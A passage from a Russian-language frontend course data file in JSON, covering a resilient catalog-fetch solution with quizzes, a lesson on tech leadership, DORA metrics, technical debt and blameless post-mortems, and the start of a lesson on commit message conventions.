        "js": "const STATIC_FALLBACK_DATA = [\n  { id: 'fallback-1', title: 'Базовый товар (Оффлайн-режим)', price: 999 },\n  { id: 'fallback-2', title: 'Популярный товар каталога', price: 1499 },\n];\n\nexport async function fetchProductCatalogWithFallback(category) {\n  const controller = new AbortController();\n  const timeoutId = setTimeout(() => controller.abort(), 2000);\n  const cacheKey = `/api/catalog/${category}`;\n\n  try {\n    // 1. Попытка запроса к основному API с таймаутом 2с\n    const response = await fetch(cacheKey, { signal: controller.signal });\n    clearTimeout(timeoutId);\n\n    if (response.ok) {\n      const data = await response.json();\n      // Сохраняем свежую копию в Cache Storage\n      if ('caches' in window) {\n        const cache = await caches.open('catalog-v1');\n        cache.put(cacheKey, new Response(JSON.stringify(data)));\n      }\n      return { products: data, isDegraded: false };\n    }\n    throw new Error(`HTTP Error: ${response.status}`);\n  } catch (error) {\n    clearTimeout(timeoutId);\n    console.warn('[System Design Fallback]: Основной API недоступен, переход на Graceful Fallback:', error.message);\n\n    // 2. Попытка извлечь закешированную копию\n    if ('caches' in window) {\n      const cachedResponse = await caches.match(cacheKey);\n      if (cachedResponse) {\n        const cachedData = await cachedResponse.json();\n        return { products: cachedData, isDegraded: true, source: 'cache' };\n      }\n    }\n\n    // 3. Аварийный откат на статический набор (Disaster Recovery)\n    return { products: STATIC_FALLBACK_DATA, isDegraded: true, source: 'disaster-recovery' };\n  }\n}\n\nconsole.log('Отказоустойчивый сервис каталога успешно инициализирован!');",
        "explanation": "Функция реализует трехуровневую защиту от сбоев: основной сетевой запрос с таймаутом, локальный кэш и статический Disaster Recovery массив."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro20-q1",
          "question": "Что скрывается за буквой D во фреймворке RADIO?",
          "options": [
            "Развёртывание: выбор стратегии выката изменений и отката при сбое",
            "Токены дизайна: цвета, отступы и типографика будущего интерфейса",
            "Отладка: инструменты поиска ошибок в уже работающей системе",
            "Модель данных: сущности, их связи и устройство клиентского состояния"
          ],
          "correctIndex": 3,
          "explanation": "Фреймворк задаёт порядок разговора на проектировании: требования, архитектура и компоненты, модель данных, интерфейсы между частями и оптимизации. Шаг модели данных отвечает на вопросы, какие сущности существуют, как они связаны, что хранится нормализованно, а что производно — и обычно именно здесь всплывают неочевидные проблемы будущей системы."
        },
        {
          "id": "pro20-q2",
          "question": "Чем документ с предложением изменений отличается от записи об архитектурном решении?",
          "options": [
            "Первый пишется до реализации и собирает отзывы, второй фиксирует принятое решение",
            "Первый описывает код приложения, второй — инфраструктуру и настройки развёртывания",
            "Первый ведёт менеджер проекта, а второй составляет технический руководитель команды",
            "Разницы нет: это два названия одного документа, принятые в разных компаниях"
          ],
          "correctIndex": 0,
          "explanation": "Первый документ — способ обсудить подход, пока не написано ни строчки: в нём есть проблема, варианты решения, компромиссы и открытые вопросы, а команда оставляет замечания. Второй пишется коротко и по факту: контекст, принятое решение и его последствия. Через год он отвечает новому человеку на вопрос, почему выбрали именно это, не заставляя раскапывать историю обсуждений."
        },
        {
          "id": "pro20-q3",
          "question": "В ленте десять тысяч карточек, и вкладка начинает подтормаживать. Что даёт виртуализация списка?",
          "options": [
            "Карточки сжимаются до миниатюр, освобождая место в видимой области экрана",
            "Изображения карточек загружаются постепенно, по мере прокрутки до нужной позиции",
            "В дереве документа остаются только видимые карточки и небольшой запас вокруг них",
            "Лента разбивается на страницы по сто элементов с переключателем страниц внизу"
          ],
          "correctIndex": 2,
          "explanation": "Каждая карточка — это десятки узлов, и на десяти тысячах записей браузер захлёбывается на пересчёте раскладки и расходе памяти. Виртуализация держит в документе лишь то, что видно, плюс буфер сверху и снизу, подменяя остальное распорками нужной высоты, чтобы полоса прокрутки вела себя естественно. Отложенная загрузка картинок помогает трафику, но узлы в документе остаются все."
        },
        {
          "id": "pro20-q4",
          "question": "Пользователь листает ленту, и в это время публикуются новые посты. Что произойдёт при выборке страниц по смещению?",
          "options": [
            "Ничего: смещение пересчитывается сервером заново при каждом следующем запросе",
            "Записи сдвинутся, и часть постов повторится, а часть окажется пропущенной",
            "Запрос вернёт ошибку, поскольку смещение выйдет за границы текущей выборки",
            "Новые посты автоматически вставятся в начало уже загруженного пользователем списка"
          ],
          "correctIndex": 1,
          "explanation": "Смещение указывает на позицию в постоянно меняющемся списке. Появилось пять новых постов сверху — и записи, которые были на позициях с двадцатой по тридцатую, уехали вниз: часть из них придёт повторно, а часть проскочит мимо незамеченной. Курсор указывает не на позицию, а на конкретную запись, и выборка «всё, что после неё» остаётся корректной при любых вставках."
        },
        {
          "id": "pro20-q5",
          "question": "Сервис рекомендаций отвечает по десять секунд и роняет вместе с собой страницу товара. Что предпринять?",
          "options": [
            "Поставить короткий таймаут и размыкатель цепи, показывая заглушку при сбое",
            "Увеличить время ожидания, чтобы запрос гарантированно успевал завершиться",
            "Перенести запрос рекомендаций в начало загрузки, до основной информации о товаре",
            "Кешировать рекомендации на сервере, полностью отказавшись от персонализации"
          ],
          "correctIndex": 0,
          "explanation": "Второстепенный блок не имеет права блокировать покупку. Короткий таймаут ограничивает ожидание, а размыкатель после серии неудач перестаёт обращаться к сервису вовсе и какое-то время сразу отдаёт запасной вариант — это и разгружает падающий сервис, и убирает задержку у пользователя. Вместо рекомендаций показывается заглушка или популярные товары, а страница остаётся рабочей."
        }
      ]
    }
  },
  {
    "id": "pro-21",
    "moduleId": "pro",
    "level": 21,
    "title": "Техническое лидерство (Tech Lead), Управление техдолгом и Инженерные процессы (DORA)",
    "subtitle": "Роль Tech Lead & Staff Engineer, Technical Debt Quadrant, метрики DORA (Deployment Frequency, MTTR), онбординг, Skill Matrix и Blameless Post-Mortem",
    "description": "Освойте компетенции технического лидера (Tech Lead / Staff Frontend Engineer): переход от написания кода к архитектурному визионерству и развитию команды, управление техническим долгом по квадранту Мартина Фаулера и паттерну Strangler Fig, мониторинг инженерных метрик эффективности DORA (Lead Time, MTTR), построение процессов быстрого онбординга и культуру Blameless Post-Mortem.",
    "estimatedMinutes": 80,
    "difficulty": "advanced",
    "tags": [
      "tech-lead",
      "staff-engineer",
      "technical-debt",
      "dora-metrics",
      "engineering-culture",
      "skill-matrix",
      "onboarding",
      "post-mortem",
      "leadership",
      "career"
    ],
    "theory": {
      "overview": "Высшая ступень карьеры разработчика — позиция **Tech Lead** или **Staff / Principal Engineer**. На этом уровне ваш вклад измеряется не количеством закрытых тикетов в Jira, а **успехом всей инженерной команды**, скоростью доставки ценности в продакшен и устойчивостью технической архитектуры бизнеса.\n\nВ этом финальном уроке программы мы разберём переход от Senior к Lead-инженеру, системное управление **техническим долгом**, объективные метрики продуктивности команд **DORA** и построение культуры психологической безопасности и профессионального роста.",
      "sections": [
        {
          "title": "Роль Tech Lead и Staff Engineer: баланс кода, архитектуры и людей",
          "content": "Трансформация мышления при переходе от Senior к Lead:\n\n1. **Структура рабочего времени Tech Lead (Правило третей)**:\n- **30–40% — Код**: реализация критических архитектурных ядер, доказательств концепций (PoC), сложных интеграций и рефакторинга.\n- **30% — Архитектурное визионерство**: написание RFC, ревью архитектурных предложений, оценка технической реализуемости бизнес-фич со стейкхолдерами (Product Managers, CTO).\n- **30% — Развитие команды и процессы**: менторинг, 1-on-1 встречи, онбординг, найм, декомпозиция сложных эпиков.\n\n2. **Два трека развития Senior+ инженера**:\n- **Management Track (Engineering Manager / Team Lead)**: фокус на людях, карьерном росте сотрудников, процессах Scrum, бюджетах и найме.\n- **Individual Contributor (IC) Track (Staff / Principal Engineer)**: фокус на глубокой технической экспертизе, архитектуре платформ, масштабировании систем и технологических стандартах компании.",
          "image": {
            "src": "/images/lessons/web-tech-leadership-dora.svg",
            "alt": "Техническое лидерство, Управление техдолгом и метрики DORA",
            "caption": "Роль Tech Lead / Staff, квадрант управления техдолгом Мартина Фаулера и 4 инженерные метрики DORA"
          },
          "codeExample": {
            "language": "json",
            "code": "# Пример структуры матрицы компетенций (Engineering Skill Matrix)\n{\n  \"role\": \"Senior Frontend Engineer\",\n  \"tracks\": {\n    \"technical_excellence\": [\n      \"Проектирует архитектуру микрофронтендов и PWA\",\n      \"Оптимизирует Core Web Vitals до уровня P95 < 2.0s\",\n      \"Пишет исчерпывающие RFC перед реализацией\"\n    ],\n    \"execution_ownership\": [\n      \"Самостоятельно декомпозирует квартальные эпики на задачи\",\n      \"Управляет рисками и техническим долгом в спринтах\",\n      \"Дежурит в On-Call ротации и проводит Post-Mortem\"\n    ],\n    \"leadership_mentoring\": [\n      \"Менторит Junior и Middle инженеров\",\n      \"Проводит технические интервью на System Design\",\n      \"Внедряет новые инженерные практики в гильдию\"\n    ]\n  }\n}",
            "title": "Матрица компетенций (Skill Matrix) для прозрачного роста инженеров",
            "explanation": "Прозрачная матрица компетенций исключает субъективность в оценках и дает четкий roadmap профессионального роста."
          }
        },
        {
          "title": "Управление техническим долгом: Квадрант Фаулера и паттерн Strangler Fig",
          "content": "Как грамотно бороться с устаревшим кодом без остановки бизнеса:\n\n1. **Квадрант техдолга Мартина Фаулера (Technical Debt Quadrant)**:\n- **Оправданный и осознанный (Deliberate & Prudent)**: «Мы сознательно выпускаем MVP без виртуализации, чтобы успеть к конференции, но закладываем 2 недели на оптимизацию в следующем месяце» — ✅ Нормальный инструмент бизнеса.\n- **Неосознанный и безрассудный (Reckless & Inadvertent)**: код низкого качества, написанный без тестов из-за отсутствия квалификации — ❌ Опасный яд для кодовой базы.\n\n2. **Стратегии возврата техдолга**:\n- **Правило 20% (The 20% Rule)**: 20% емкости (Story Points) каждого спринта резервируется исключительно на технический долг, рефакторинг и обновление зависимостей.\n- **Паттерн Strangler Fig (Душитель)**: монолитное легаси-приложение не переписывается с нуля годами (что почти всегда ведет к банкротству проекта), а плавно заменяется новыми модулями страница за страницей через прокси-роутер.",
          "codeExample": {
            "language": "typescript",
            "code": "// Реализация паттерна Strangler Fig на уровне роутинга (Next.js / Nginx)\n// Постепенный перевод страниц со старого легаси-монолита на новый стек\n\nexport const routingProxyConfig = {\n  async handleRequest(req: Request) {\n    const url = new URL(req.url);\n    \n    // 1. Новые модули, переписанные на чистый React + FSD:\n    const modernRoutes = ['/checkout', '/profile', '/catalog'];\n    if (modernRoutes.some(route => url.pathname.startsWith(route))) {\n      return forwardToModernSpa(req);\n    }\n    \n    // 2. Старые легаси-страницы монолита (будут заменены следующими):\n    console.log('[Strangler Fig]: Запрос направлен в старый монолит:', url.pathname);\n    return forwardToLegacyMonolith(req);\n  }\n};",
            "title": "Паттерн Strangler Fig для безопасного поэтапного рефакторинга",
            "explanation": "Strangler Fig исключает риски 'Big Bang rewrite', позволяя инкрементально модернизировать систему на живом продакшене."
          }
        },
        {
          "title": "4 Метрики DORA: Объективная оценка зрелости инженерных процессов",
          "content": "Стандарт измерения производительности разработки от Google Cloud DORA:\n\n1. **4 Ключевые метрики DORA (DevOps Research & Assessment)**:\n- **1. Deployment Frequency (Частота деплоев)**:\n  Как часто рабочий код попадает в продакшен. *Elite команды*: несколько раз в день; *Низкий уровень*: раз в месяц.\n- **2. Lead Time for Changes (Время доставки изменений)**:\n  Время от первого коммита в ветку до появления фичи у пользователей. *Elite команды*: менее 1 часа.\n- **3. Change Failure Rate (Процент сбоев при релизах)**:\n  Доля деплоев, потребовавших хотфикса или отката (Rollback). *Elite команды*: 0–5%.\n- **4. Time to Restore Service / MTTR (Время восстановления)**:\n  Сколько времени требуется для устранения аварии в проде. *Elite команды*: менее 1 часа.\n\n2. **Культура Blameless Post-Mortem (Разбор без поиска виноватых)**:\n- Когда случается прод-инцидент, фокус смещается с «Кто виноват?» на «Какое системное улучшение в тестах/CI/CD защитит нас от повторения этой ошибки навсегда?»",
          "codeExample": {
            "language": "json",
            "code": "# docs/post-mortems/2026-08-20-auth-token-outage.md\n# Blameless Post-Mortem: Инцидент INC-842 (Сбой авторизации)\n\n## Дата и длительность\n2026-08-20: 14:15 – 14:48 UTC (Простой: 33 минуты, MTTR: 33 мин)\n\n## Влияние на пользователей\nОколо 4 200 пользователей не смогли войти в личный кабинет.\n\n## Корневая причина (Root Cause)\nПри обновлении схемы cookie был пропущен атрибут SameSite, что привело к блокировке запросов в браузере Safari.\n\n## Хронология событий (Timeline)\n- 14:15 — Релиз версии v2.4.1\n- 14:20 — Сработал алерт Sentry: Error Rate > 2.5% в Slack #frontend-alerts\n- 14:25 — Инженеры подтвердили проблему и инициировали Rollback на v2.4.0\n- 14:48 — Сервис полностью восстановлен\n\n## Корректирующие действия (Action Items)\n1. Добавить Playwright E2E тест на авторизацию в Safari в CI пайплайн (Отв: Иван, до 22.08)\n2. Внедрить автоматический Canary деплой на 5% трафика (Отв: Анна, до 30.08)",
            "title": "Пример отчета Blameless Post-Mortem по стандарту Google SRE",
            "explanation": "Post-Mortem анализирует хронологию инцидента и формирует конкретные задачи по автоматизации защиты от повторения ошибки."
          }
        },
        {
          "title": "Онбординг, найм и построение сильной инженерной культуры",
          "content": "Создание среды, где инженеры растут и создают лучший продукт:\n\n1. **Процесс онбординга «First Day Deploy»**:\n- Главный индикатор зрелости платформы и документации — способность нового интерна или джуниора **задеплоить свой первый маленький коммит в продакшен в первый же рабочий день**!\n- Назначение персонального наставника (**Buddy**) на первые 90 дней для ответов на любые вопросы без страха показаться некомпетентным.\n\n2. **Проведение экологичных собеседований**:\n- Отказ от решения олимпиадных задач на алгоритмы, оторванных от реальности веба.\n- Фокус на практическом Live Coding (рефакторинг реального компонента с багом), System Design интервью (проектирование ленты/мессенджера) и оценке Cultural Fit (умение слушать, давать и принимать фидбек).",
          "codeExample": {
            "language": "bash",
            "code": "# Чеклист первого дня нового разработчика (Onboarding Runbook):\n# 1. Клонирование репозитория и подъем среды одной командой:\npnpm install && pnpm dev\n\n# 2. Прогон всех локальных тестов и линтеров:\npnpm test:run && pnpm lint\n\n# 3. Решение первой 'Good First Issue' задачи (например, добавление себя в contributors.json)\n# 4. Открытие первого Pull Request -> Прохождение CI -> Автоматический деплой на Preview!\n# 5. Успешный Merge в main -> Деплой на Vercel Production в первый день! 🎉",
            "title": "Чеклист First Day Deploy для идеального онбординга инженеров",
            "explanation": "Автоматизированный онбординг ускоряет вывод нового сотрудника на 100% продуктивность с месяцев до недель."
          }
        }
      ],
      "seniorTips": [
        "Фокусируйтесь на 4 метриках DORA — они объективно отражают здоровье процессов доставки кода и зрелость CI/CD пайплайна вашей команды.",
        "Внедряйте культуру Blameless Post-Mortem: любая авария на проде — это не вина конкретного разработчика, а недоработка системы тестирования и мониторинга.",
        "Используйте правило 20% для непрерывного возврата техдолга — это предотвращает необходимость болезненного глобального переписывания проекта.",
        "Создайте прозрачную матрицу компетенций (Skill Matrix) с понятными критериями перехода между грейдами (Junior → Middle → Senior → Staff).",
        "Стремитесь к метрике First Day Deploy для новых инженеров — это лучший стресс-тест вашей документации и скриптов инициализации проекта."
      ],
      "commonMistakes": [
        {
          "bad": "// Поиск виноватых и наказание разработчика, допустившего баг на проде",
          "good": "// Проведение Blameless Post-Mortem и добавление автоматического E2E теста в CI/CD",
          "reason": "Поиск виноватых рождает страх и скрытие ошибок. Культура безопасности стимулирует открытость и улучшение процессов."
        },
        {
          "bad": "// Полный 'Big Bang' перепис проекта с нуля с заморозкой разработки бизнес-фич на год",
          "good": "// Инкрементальная замена модулей по паттерну Strangler Fig",
          "reason": "Переписывание с нуля почти всегда срывает сроки, теряет бизнес-контекст и порождает новые неизвестные баги."
        },
        {
          "bad": "// Редкие гигантские релизы раз в 2 месяца с сотнями коммитов",
          "good": "// Непрерывный деплой маленьких изолированных фич по несколько раз в день (Trunk-based development)",
          "reason": "Маленькие релизы снижают Change Failure Rate и позволяют мгновенно локализовать сбой при инциденте."
        }
      ],
      "keyTakeaways": [
        "Tech Lead балансирует между кодом, архитектурным планированием (RFC) и развитием людей.",
        "Осознанный техдолг допустим для проверки гипотез, но требует регулярного возврата по правилу 20%.",
        "4 метрики DORA (Deployment Frequency, Lead Time, Change Failure Rate, MTTR) измеряют инженерную зрелость.",
        "Blameless Post-Mortem превращает инциденты в системные улучшения архитектуры и тестов.",
        "First Day Deploy — эталон эффективного процесса онбординга новых инженеров."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"tech-lead-sandbox\">\n  <h3>Tech Leadership: DORA Metrics & Incident Simulator</h3>\n  <div style=\"display:flex; gap:8px; margin-bottom:12px; flex-wrap:wrap;\">\n    <button id=\"btn-dora-audit\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">1. DORA Metrics Audit</button>\n    <button id=\"btn-post-mortem\" style=\"background:#29e7ff; color:#0a0e13; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">2. Blameless Post-Mortem</button>\n  </div>\n  <pre id=\"lead-log\" style=\"color:#e6edf3; font-size:12px; line-height:1.5; background:#161b22; padding:12px; border-radius:6px; min-height:90px;\"></pre>\n</div>",
      "initialCss": "#tech-lead-sandbox { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
      "initialJs": "const log = document.getElementById('lead-log');\n\ndocument.getElementById('btn-dora-audit').onclick = () => {\n  log.textContent = '📊 [DORA Metrics Dashboard — Q3 Performance]:\\n';\n  log.textContent += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\\n';\n  log.textContent += '🚀 Deployment Frequency: 6.4 деплоя в день (ELITE РЕЙТИНГ)\\n';\n  log.textContent += '⏱️ Lead Time for Changes: 42 минуты от PR до прода (ELITE)\\n';\n  log.textContent += '🛡️ Change Failure Rate: 1.8% (Цель < 5% — В НОРМЕ)\\n';\n  log.textContent += '🔄 Time to Restore (MTTR): 18 минут (Авто-откат Canary релизов)\\n';\n  log.textContent += '\\n🏆 Команда работает по стандарту Elite High-Performing Engineering!';\n  log.style.color = '#2dff8a';\n};\n\ndocument.getElementById('btn-post-mortem').onclick = () => {\n  log.textContent = '📋 [Blameless Post-Mortem INC-492]:\\n';\n  log.textContent += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\\n';\n  log.textContent += '🚨 Инцидент: Сбой рендеринга корзины после релиза v2.4.1 (Длительность: 18 мин)\\n';\n  log.textContent += '🔍 Root Cause: Редкий кейс при пустом промокоде в Safari\\n';\n  log.textContent += '💡 Культура: 0 обвинений разработчика! Фокус на усилении CI пайплайна.\\n';\n  log.textContent += '✅ Action Items: Добавлен E2E тест на пустой промокод в Playwright CI.';\n  log.style.color = '#29e7ff';\n};",
      "instructions": "Практика с процессами лидерства:\n1. Нажмите '1. DORA Metrics Audit' для проверки 4 ключевых показателей эффективности команды\n2. Нажмите '2. Blameless Post-Mortem' для просмотра отчета о разборе инцидента без обвинений"
    },
    "task": {
      "title": "Разработка калькулятора инженерных метрик DORA и классификатора рейтинга команды",
      "scenario": "Создайте класс DoraMetricsAnalyzer, который принимает статистику деплоев и инцидентов команды, рассчитывает 4 метрики DORA (Deployment Frequency, Lead Time, Change Failure Rate, MTTR) и возвращает инженерный грейд команды: 'Elite', 'High', 'Medium' или 'Low' на основе официальных порогов Google Cloud DORA.",
      "criteria": [
        "Реализован метод calculateMetrics({ deploymentsCount, daysCount, leadTimeMinutes, failedDeployments, totalRestoreMinutes })",
        "Корректно рассчитываются deploymentFrequencyPerDay, changeFailureRatePercentage, averageMttrMinutes",
        "При deploymentFrequency >= 1/день, leadTime < 60мин, failureRate < 5%, MTTR < 60мин присваивается рейтинг 'Elite'",
        "Возвращается полный структурированный отчет с рекомендациями по улучшению процессов"
      ],
      "starterCode": {
        "js": "// Реализуйте калькулятор метрик DORA\nexport class DoraMetricsAnalyzer {\n  // Ваш код\n}"
      },
      "hints": [
        "changeFailureRate = (failedDeployments / deploymentsCount) * 100",
        "const isElite = deployFreq >= 1 && leadTimeMinutes < 60 && failureRate < 5 && mttr < 60;"
      ],
      "solution": {
        "js": "export class DoraMetricsAnalyzer {\n  analyze({\n    deploymentsCount,\n    daysCount,\n    leadTimeMinutes,\n    failedDeployments,\n    totalRestoreMinutes,\n  }) {\n    const deploymentFrequencyPerDay = deploymentsCount / daysCount;\n    const changeFailureRate = deploymentsCount > 0 ? (failedDeployments / deploymentsCount) * 100 : 0;\n    const averageMttrMinutes = failedDeployments > 0 ? totalRestoreMinutes / failedDeployments : 0;\n\n    let grade = 'Low';\n    if (\n      deploymentFrequencyPerDay >= 1 &&\n      leadTimeMinutes <= 60 &&\n      changeFailureRate < 5 &&\n      averageMttrMinutes <= 60\n    ) {\n      grade = 'Elite';\n    } else if (\n      deploymentFrequencyPerDay >= 0.2 &&\n      leadTimeMinutes <= 1440 &&\n      changeFailureRate < 15 &&\n      averageMttrMinutes <= 1440\n    ) {\n      grade = 'High';\n    } else if (deploymentFrequencyPerDay >= 0.05) {\n      grade = 'Medium';\n    }\n\n    return {\n      grade,\n      metrics: {\n        deploymentFrequencyPerDay: Number(deploymentFrequencyPerDay.toFixed(2)),\n        leadTimeMinutes,\n        changeFailureRatePercentage: Number(changeFailureRate.toFixed(2)),\n        averageMttrMinutes: Number(averageMttrMinutes.toFixed(1)),\n      },\n      isHighPerforming: grade === 'Elite' || grade === 'High',\n    };\n  }\n}\n\nconsole.log('DoraMetricsAnalyzer успешно протестирован и готов к использованию!');",
        "explanation": "Анализатор объективно рассчитывает ключевые метрики зрелости процессов доставки и классифицирует команду по международным стандартам DORA."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro21-q1",
          "question": "Какой из показателей НЕ входит в набор метрик DORA?",
          "options": [
            "Частота выкатов изменений в продакшен",
            "Время от коммита до попадания изменения к пользователям",
            "Доля выкатов, приведших к сбою в работе сервиса",
            "Количество строк кода, написанных командой за спринт"
          ],
          "correctIndex": 3,
          "explanation": "Четыре метрики описывают скорость и надёжность доставки: как часто выкатываемся, сколько времени изменение идёт до продакшена, как часто ломаемся и как быстро восстанавливаемся. Объём написанного кода не говорит ни о том, ни о другом — его легко нарастить копированием и раздуванием решений, поэтому как показатель продуктивности он вреден."
        },
        {
          "id": "pro21-q2",
          "question": "Легаси-монолит нужно перевести на новый стек, не останавливая бизнес. Что предлагает подход «душителя»?",
          "options": [
            "Заморозить разработку, переписать проект целиком и затем переключить трафик разом",
            "Заводить новые страницы на новом стеке и постепенно переводить старые через маршрутизацию",
            "Оставить старый код как есть и дописывать новое поверх, не трогая исходную структуру",
            "Разделить проект на микросервисы, каждый из которых переписывает отдельная команда"
          ],
          "correctIndex": 1,
          "explanation": "Полное переписывание почти всегда срывает сроки: вместе со старым кодом теряется накопленный бизнес-контекст и сотни негласных правил, а бизнес всё это время не получает новых возможностей. Подход предлагает поставить перед приложением слой маршрутизации и переводить на новый стек по одному разделу, постепенно вытесняя старую систему. Каждый шаг маленький, проверяемый и при необходимости обратимый."
        },
        {
          "id": "pro21-q3",
          "question": "После аварии на продакшене команда выясняет, кто именно отправил сломанный код. Что не так с таким разбором?",
          "options": [
            "Ничего: персональная ответственность дисциплинирует остальных участников команды",
            "Страх наказания заставляет скрывать ошибки, а искать нужно пробел в самих процессах",
            "Разбор следует проводить не сразу, а примерно через неделю после инцидента",
            "Выяснять причину должен только технический руководитель, а не вся команда целиком"
          ],
          "correctIndex": 1,
          "explanation": "Если за аварию наказывают, люди перестают сообщать о подозрительных симптомах и начинают прятать инциденты — и система становится опаснее. Правильный вопрос не «кто», а «почему это вообще оказалось возможным»: почему проверка пропустила ошибку, почему мониторинг молчал, почему откат занял сорок минут. Итог такого разбора — не выговор, а несколько конкретных изменений в процессах."
        },
        {
          "id": "pro21-q4",
          "question": "Что означает правило двадцати процентов в управлении техническим долгом?",
          "options": [
            "Пятая часть кодовой базы допустимо остаётся без покрытия автоматическими тестами",
            "Пятая часть ёмкости каждого спринта резервируется под рефакторинг и обновления",
            "Раз в пять спринтов команда полностью останавливает работу над продуктовыми задачами",
            "Двадцать процентов рабочего времени каждый инженер тратит на собственные проекты"
          ],
          "correctIndex": 1,
          "explanation": "Долг возвращают понемногу и постоянно, а не героическими рывками. Постоянная доля ёмкости под обновление зависимостей, покрытие тестами и разбор проблемных мест не даёт проекту сползти в состояние, когда любая правка занимает неделю. Отдельный «спринт рефакторинга» обычно не случается никогда: бизнес всегда найдёт для него более срочную задачу."
        },
        {
          "id": "pro21-q5",
          "question": "Зачем стремиться к тому, чтобы новый инженер выкатил своё первое изменение в первый же день?",
          "options": [
            "Это стресс-тест документации и автоматизации: всё лишнее и устаревшее вскрывается сразу",
            "Это позволяет проверить квалификацию новичка до окончания испытательного срока",
            "Это помогает закрыть больше задач текущего спринта силами нового сотрудника",
            "Это прямое требование методологии к процессу ввода новых участников в команду"
          ],
          "correctIndex": 0,
          "explanation": "Показатель измеряет не человека, а процесс. Если запуск проекта требует трёх дней шаманства, полузабытых переменных окружения и личной помощи двух коллег, проблема в проекте, а не в новичке. Стремление к выкату в первый день заставляет держать инструкцию актуальной, а запуск — автоматическим, и это окупается для всей команды, а не только для новых людей."
        }
      ]
    }
  },
  {
    "id": "pro-22",
    "moduleId": "pro",
    "level": 22,
    "title": "Стандарты коммитов: Airbnb Git Style Guide, Conventional Commits и Git Hooks",
    "subtitle": "Анатомия коммита, типы изменений (feat, fix, refactor...), правило 50/72, Husky, commitlint и автоматизация релизов",
    "description": "Глубокое практическое руководство по культуре коммитов в ведущих IT-компаниях: стандарты Airbnb и Conventional Commits 1.0, атомарность, оформление Scope, Body и Breaking Changes, автоматическая валидация через Husky и commitlint, генерация CHANGELOG и семантическое версионирование (SemVer).",
    "estimatedMinutes": 45,
    "difficulty": "advanced",
    "tags": [
      "Git",
      "Airbnb Style",
      "Conventional Commits",
      "Husky",
      "commitlint",
      "SemVer",
      "Git Hooks",
      "CI/CD",
      "Code Quality"
    ],
    "theory": {
      "overview": "В профессиональной командной разработке история системы контроля версий (`git log`) — это не просто архив сохранённых файлов, а живая техническая документация продукта. Небрежные сообщения коммитов вроде `fix`, `wip`, `update` или `asdasd` превращают отладку в кошмар, парализуют поиск регрессий через `git bisect` и делают невозможной автоматизацию релизов.\n\nСтандарты **Airbnb Git Style Guide** и **Conventional Commits 1.0** — общепринятый золотой стандарт оформления коммитов в high-level IT-компаниях. Они превращают историю репозитория в машиночитаемый реестр изменений, позволяющий автоматически вычислять версии по SemVer, генерировать `CHANGELOG.md` и ускорять Code Review.",
      "sections": [
        {
          "title": "Зачем IT-индустрии строгий стандарт именования коммитов?",
          "content": "История коммитов решает три критически важные инженерные задачи:\n\n1. **Мгновенный контекст на Code Review**: Ревьюер открывает пулл-реквест и по списку коммитов понимает логику мышления автора ещё до погружения в строчки кода.\n2. **Ускоренная локализация багов (`git bisect` и `git log --grep`)**: Если в продакшене возник баг, можно за секунды найти коммит, изменивший нужный модуль, или выполнить автоматический бинарный поиск виновного коммита.\n3. **Автоматический релизный пайплайн (Semantic Release & SemVer)**: Инструменты автоматизации (`semantic-release`, `standard-version`, `release-please`) парсят историю коммитов в ветке `main` и без участия человека определяют номер следующей версии и формируют `CHANGELOG.md`.",
          "image": {
            "src": "/images/lessons/git-commit-anatomy-airbnb.svg",
            "alt": "Анатомия коммита по стандарту Airbnb и Conventional Commits",
            "caption": "Схема 1: Анатомия коммита — Type, Scope, Subject, Body и Footer"
          }
        },
        {
          "title": "Анатомия коммита: Правило 50/72 и Императивный залог",
          "content": "Согласно стандартам Airbnb и Conventional Commits, коммит состоит из заголовка (Header), опционального тела (Body) и подвала (Footer):\n\n```\n<type>(<scope>): <subject>\n\n[optional body]\n\n[optional footer(s)]\n```\n\n### Золотые правила оформления:\n- **Правило 50/72 (Rule 50/72)**:\n  - **Subject (тема)**: не более **50 символов** (жёсткий лимит 72). Короткий, ёмкий заголовок без точки в конце.\n  - **Body (тело)**: отделяется от заголовка пустой строкой. Каждая строка тела переносится строго на **72 символах** (для идеального отображения в `git log` терминала и GitHub GUI).\n- **Императивный залог в настоящем времени (Imperative Mood)**:\n  - Всегда пишите глагол так, будто отдаёте команду Git: `add`, `fix`, `refactor`, `remove`, `update` (НЕ `added`, `fixes`, `fixing`, `добавил`).\n  - **Проверочное правило Airbnb**: подставьте фразу *«If applied, this commit will...»* перед вашим subject. Фраза *«If applied, this commit will add OAuth2 login»* звучит грамматически безупречно, а *«...will added OAuth2 login»* — с ошибкой.\n- **Регистр**: Заголовок и тип начинаются со строчной (маленькой) буквы: `feat: ...`, а не `Feat: ...`.",
          "codeExample": {
            "language": "bash",
            "title": "ПРИМЕР ИДЕАЛЬНОГО КОММИТА ПО AIRBNB & CONVENTIONAL COMMITS",
            "code": "feat(checkout): add promo code discount calculation\n\nIntegrate promo code validation endpoint with cart total calculation.\nApply 15% discount for first-time buyers and display savings badge.\nHandle invalid and expired coupon error states gracefully.\n\nCloses #204, Refs #189"
          }
        },
        {
          "title": "Таксономия типов коммитов (Commit Types Taxonomy)",
